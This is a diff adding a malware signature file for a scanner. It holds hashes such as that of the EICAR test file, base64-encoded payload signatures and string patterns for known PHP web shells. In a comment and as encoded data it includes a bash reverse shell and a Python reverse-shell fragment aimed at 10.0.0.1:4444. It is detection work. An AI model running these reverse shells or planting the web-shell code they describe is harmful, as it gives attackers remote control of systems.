@@ -1,0 +1,42 @@
+# =============================================================================
+#  База сигнатур — signatures.sha256
+#  Підтримувані формати:
+#
+#  sha256:<hex64>        — SHA256 хеш файлу у hex (стандартний формат sha256sum)
+#  sha256b64:<base64>    — SHA256 хеш у base64 (коротший запис, 44 символи)
+#  b64sig:<base64>       — підозрілий base64 payload (декодується і хешується)
+#  str:<pattern>         — рядковий патерн (пошук grep -F у вмісті файлу)
+#  # рядок-коментар      — ігнорується
+#
+#  Генерація записів:
+#    sha256:    echo "sha256:$(sha256sum /шлях | cut -c1-64)"
+#    sha256b64: echo "sha256b64:$(sha256sum /шлях | cut -c1-64 | xxd -r -p | base64)"
+#    b64sig:    echo "b64sig:$(cat payload.bin | base64 -w0)"
+#    str:       echo "str:підозрілий рядок"
+# =============================================================================
+
+# ── SHA256 хеші відомих загроз (hex формат) ──────────────────────────────────
+# EICAR test file — стандартний тестовий "вірус"
+sha256:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
+
+# ── SHA256 хеші у base64 (компактний формат) ─────────────────────────────────
+# Той самий EICAR у base64 (для прикладу формату)
+# sha256b64:J1oCG7+2SJ5U1HGZn325HWY/xpXsL+KixFOKq/ZR/Q8=
+
+# ── Підозрілі base64 payload (шелкод, дропери) ───────────────────────────────
+# /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1
+b64sig:L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=
+
+# python reverse shell
+b64sig:aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk=
+
+# ── Рядкові патерни (відомі веб-шели і бекдори) ──────────────────────────────
+str:r57shell
+str:c99shell
+str:b374k
+str:FilesMan
+str:$_POST['cmd']
+str:passthru($_GET
+str:system($_REQUEST
+str:exec($_GET['cmd
+str:base64_decode($
